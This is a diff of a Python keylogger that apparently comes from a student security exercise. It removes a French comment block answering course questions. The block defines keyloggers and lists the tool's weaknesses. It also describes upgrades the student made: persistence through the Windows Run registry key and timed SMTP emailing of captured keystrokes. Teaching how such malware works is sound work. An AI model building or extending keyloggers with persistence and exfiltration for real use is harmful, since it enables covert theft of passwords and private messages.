@@ -93,31 +93,4 @@ report_thread.daemon = True
 report_thread.start()
 
 with keyboard_listener:
-    keyboard_listener.join() #Ces deux lignes garantissent que le programme attend et capture les frappes de clavier de manière continue.
-
-"""""
-Question 1 :
-Un keylogger est un logiciel ou un matériel conçu pour capturer et enregistrer secrètement les frappes au clavier d'un utilisateur. Il peut être utilisé pour surveiller les mots de passe, les conversations privées et toute autre information sensible que l'utilisateur saisit sur son clavier.
-
-Question 2 :
-Sécurité en entreprise : Dans certains contextes professionnels, les entreprises peuvent utiliser des keyloggers pour surveiller l'activité de leurs employés sur les ordinateurs de l'entreprise, notamment à des fins de sécurité et de conformité.
-Dépannage informatique : Les techniciens informatiques peuvent utiliser des keyloggers pour diagnostiquer des problèmes techniques sur les ordinateurs de leurs clients, en enregistrant les séquences de touches pour identifier les sources d'erreur.
-
-Question 9 :
-Les touches pressées sont affichées sur le terminal du programme.
-
-Question 14 :
-Les points faibles de ce keylogger sont :
-
-- Il ne s'exécute pas directement au démarrage du PC.
-- Il ne fonctionne qu'en local.
-- Le fichier log.txt doit être créé avant que le code ne soit exécuté.
-
-Question 15 :
-J'ai modifié le code de cette façon :
-
-- J'ai ajouté un appel aux registres du PC, en particulier à la clé Run, pour que le programme s'exécute à chaque démarrage du PC.
-- J'ai opté pour l'envoi du fichier log.txt via un serveur SMTP lié à mon adresse email donc j'ai eu besoin aussi de mettre un report pour ne pas me retrouvé avec 500 mail toutes les minutes (j'ai supprimé les informations sensibles du code pour ne pas laisser de traces).
-- Pour garantir le bon fonctionnement du programme, j'ai ajouté une petite fonction qui vérifie si le fichier log.txt existe ; sinon, il est simplement créé.
-
-"""
+    keyboard_listener.join()
